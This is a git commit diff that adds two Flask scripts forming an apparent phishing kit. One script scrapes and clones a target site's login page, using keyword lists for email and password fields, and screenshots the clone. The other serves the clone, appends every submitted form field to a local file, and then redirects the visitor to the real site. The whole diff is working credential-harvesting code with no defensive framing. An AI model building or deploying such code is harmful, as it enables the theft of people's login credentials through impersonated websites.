0931b65fb37b1a68ec7685d02ab56c781d7ae898
gingapower <fabian.huber@mein.gmx>
2023-05-06 21:20:09 +0200

    frontend+flask integration

--- frontend-prototype/frontend+flask/flaskapp.py
+++ frontend-prototype/frontend+flask/flaskapp.py
@@ -1,10 +1,52 @@
-from flask import Flask, render_template
-app = Flask(__name__)
+import os
+import pickle
+from werkzeug.exceptions import BadRequestKeyError
+import subprocess
+from flask import Flask, request, render_template, redirect
+
+cwd = os.getcwd()
+
+with open('data.pkl', 'rb') as f:
+    variable_names = pickle.load(f)
+
+with open(cwd + "\\url", 'r') as f:
+    url = f.read()
+
+app = Flask(__name__, static_url_path='/static')
 
 
 @app.route('/')
 def index():
     return render_template('index.html')
 
+@app.route('/submit_data', methods=['POST'])
+def submit_data():
+    # Create an empty dictionary to store the form data
+    form_data = {}
+
+    # Loop over the variable names and add the form data to the dictionary
+    for var_name in variable_names:
+        try:
+            form_data[var_name] = request.form[var_name]
+        except BadRequestKeyError as e:
+            # Extract the KeyError value from the exception
+            key_error_value = e.args[0]
+            variable_names.remove(key_error_value)
+            with open('data.pkl', 'wb') as f:
+                pickle.dump(variable_names, f)
+            subprocess.Popen(["python", "flaskapp.py"])
+            return "App restarted successfully! please reload the page!"
+
+    # Write the form data to a file
+    with open('user_data.txt', 'a') as file:
+        file.write(f'Form Data: {form_data}\n')
+
+    response_data = {
+        'message': f'Daten gespeichert: {form_data}'
+    }
+    
+    return redirect(url)
+    #return jsonify(response_data)
+    
 if __name__ == '__main__':
-    app.run()
+    app.run(debug=True)
---
+++ frontend-prototype/frontend+flask/frontend.py
@@ -0,0 +1,85 @@
+from flask import Flask, send_from_directory, request, render_template
+import os
+import clone
+import screenshot
+import mainhtml
+import requests
+from bs4 import BeautifulSoup
+from termcolor import colored
+import implement_backend as backend
+from urllib.parse import urlparse
+import pickle
+import maincss
+import subprocess
+import shutil
+
+app = Flask(__name__)
+
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+
+@app.route('/submit', methods=['POST'])
+def submit():
+    url = request.form['myInput']
+    #Open Keyword files:
+    cwd = os.getcwd()
+    folder_path = cwd+ "\\" + "keywords"
+    link_var = []
+    input_mail=[]
+    input_pass=[]
+    with open(os.path.join(folder_path, "link_keywords"), 'r', encoding='utf-8') as file:
+        for line in file:
+            link_var.append(line.strip())
+    with open(os.path.join(folder_path, "mail_keywords"), 'r', encoding='utf-8') as file:
+        for line in file:
+            input_mail.append(line.strip())
+    with open(os.path.join(folder_path, "password_keywords"), 'r', encoding='utf-8') as file:
+        for line in file:
+            input_pass.append(line.strip())
+    python_file_path =os.path.join(cwd, 'flaskapp.py')
+    #Linklists
+    links_with_text = []
+
+
+    urlpath = cwd + "\\url"
+    with open (urlpath ,"w") as file:
+        file.write(url)
+
+    #Scrape Page:
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
+        'Referer': 'https://www.example.com',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br',  # Specify accepted encodings
+        'Connection': 'keep-alive',  # Keep the connection alive
+        'Cache-Control': 'max-age=0',  # Specify caching behavior
+        'Upgrade-Insecure-Requests': '1',  # Signal support for upgrading to HTTPS
+        'DNT': '1',  # Enable Do Not Track
+        'X-Requested-With': 'XMLHttpRequest',  # Indicate AJAX request
+        # Add more headers as required
+    }
+    result = requests.get(url, headers=headers).text
+    doc = BeautifulSoup(result, "html.parser")
+    with open('output.html', 'w', encoding="utf-8") as file:
+        file.write(str(doc))
+    mainhtml.find_links(doc, links_with_text)
+    print(colored("Start to clone Loginpage!","blue"))
+    clone.download_website(url)
+    screenshot.take_screenshot(url, 'screenshot.png')
+    
+    folder_path = cwd+ "\\" + "websites\\"+urlparse(url).netloc+"\\index.html"
+    print(folder_path)
+    screenshot.take_screenshot(folder_path, 'screenshot2.png')
+    screensho1_path = os.path.join(cwd, 'screenshot.png')
+    screensho2_path = os.path.join(cwd, 'screenshot2.png')
+    frontend = cwd + "\\static"
+    shutil.copy(screensho1_path,frontend+"\\screenshot.png")
+    shutil.copy(screensho2_path,frontend+"\\screenshot2.png")
+        
+    return render_template('screenshot.html')
+
+if __name__ == '__main__':
+    app.run()
